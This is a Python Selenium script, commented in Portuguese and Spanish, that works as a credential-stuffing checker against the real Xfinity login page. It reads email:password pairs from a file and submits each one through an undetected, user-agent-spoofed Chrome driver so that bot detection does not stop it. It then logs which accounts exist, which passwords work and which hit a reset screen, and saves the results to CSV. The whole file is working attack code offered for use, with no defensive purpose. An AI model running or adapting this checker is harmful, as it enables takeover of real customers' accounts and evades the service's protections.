# IMPORTS
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import undetected_chromedriver as uc
from time import sleep
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime
import numpy as np
import pandas as pd

# configurando service para att webdriver automaticamente...
service = Service(ChromeDriverManager().install())
options = uc.ChromeOptions()
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36' # se tiver "headless" no user_agent o site bloqueia o acesso
options.add_argument('user-agent={0}'.format(user_agent))
# options.add_argument('--headless') # need to be headless or email_field doesn't works
# options.add_argument('--no-sandbox')
# options.add_argument('--mute-audio')
driver = uc.Chrome(use_subprocess=True, service=service, options=options)
driver.get("https://login.xfinity.com/login")

def valida_email(email):
    while 1 > 0:
        driver.get("https://login.xfinity.com/login")
        email_field = driver.find_elements('xpath', '//input[@placeholder="Email, mobile, or username"]')
        if bool(email_field):
            break

    email_field = driver.find_element('xpath', '//input[@placeholder="Email, mobile, or username"]')
    email_field.send_keys(email)
    sleep(1)
    email_field.submit()
    print(f'{datetime.now()} - submit email.')
    sleep(2)
    incorrect = driver.find_elements('xpath', '//prism-input[@invalid-message="The Xfinity ID or password you entered was incorrect. Please try again."]')
    if bool(incorrect):
        driver.get("https://login.xfinity.com/login")
        print(f'{datetime.now()} - correo malo')
        sleep(2)
        return 'correo malo'
    if 'compromised_uid' in driver.current_url:
        driver.get("https://login.xfinity.com/login")
        print(f'{datetime.now()} - reset password screen')
        return 'reset password screen'
    sleep(7)
    input_field = driver.find_elements('xpath', '//input[@id = "passwd"]')
    if bool(input_field):
        print(f'{datetime.now()} - correo valido')
        return 'correo valido'
    else: 
        print(f'{datetime.now()} - correo malo')
        return 'correo malo'

def valida_senha(password):
    password_field = driver.find_elements('xpath', '//input[@id = "passwd"]')
    if bool(password_field):
        password_field[0].send_keys(password)
        password_field[0].submit()
        print(f'{datetime.now()} - submit password. (aguardando resultado)')
        return True
    else: 
        print(f'{datetime.now()} - Falha ao encontrar password_field. (aguardando resultado)')
        return False

resultado = []
emails_test = np.loadtxt(fname="PRUEBA_XFINITI/test35.txt", dtype=str)

for i, email_test in enumerate(emails_test):
    email = email_test.split(':')[0]
    password = email_test.split(':')[1]
    print(f'{datetime.now()} | {i+1}° - pruebando correo: {email}')
    dict = {}
    dict['user'] = email
    dict['password'] = password  
    dict['resultado'] = valida_email(email)

    if dict['resultado'] == 'correo valido':
        print(f'{datetime.now()} | pruebando password {i+1}: {email}')
        password_encontrado = False
        count_for_while = 0
        while password_encontrado == False:
            count_for_while += 1
            if count_for_while > 5:
                print('5 tentativas de login falhadas')
                dict['contrasena'] = 'FALHA AO ANALISAR'
                break
            # se o botão de download não encontrado...
            password_field = bool(driver.find_elements('xpath', '//input[@id = "passwd"]'))
            if password_field == False:
                valida_email(email)
                sleep(7)
            if valida_senha(password):
                sleep(10)
                print(f'{datetime.now()} | URL: {driver.current_url}' )
                if 'overview' in driver.current_url or 'security-check' in driver.current_url: # login sucess
                    dict['contrasena'] = 'contrasena valida'
                    print(f'{datetime.now()} | contrasena valida')
                else: # não logou...
                    dict['contrasena'] = 'contrasena mala'
                    print(f'{datetime.now()} | contrasena mala')
                password_encontrado = True

            driver.get("https://login.xfinity.com/login")
    else: 
        dict['contrasena'] = 'null'
    
    resultado.append(dict)
    if  i % 10 == 0:
        print(f'{datetime.now()} - realizando bkp da planilha...')
        dataset = pd.DataFrame(resultado)
        dataset.to_csv(f'bkps_cache/bkp_itens_validos-{i/10}.csv', index=False) 
    print('---------------------------------------------------------------------')
    
dataset = pd.DataFrame(resultado)
dataset.to_csv(f'result-{datetime.now().timestamp()}.csv', index=False) 

print('FINISH!!!!')
sleep(5)
driver.quit()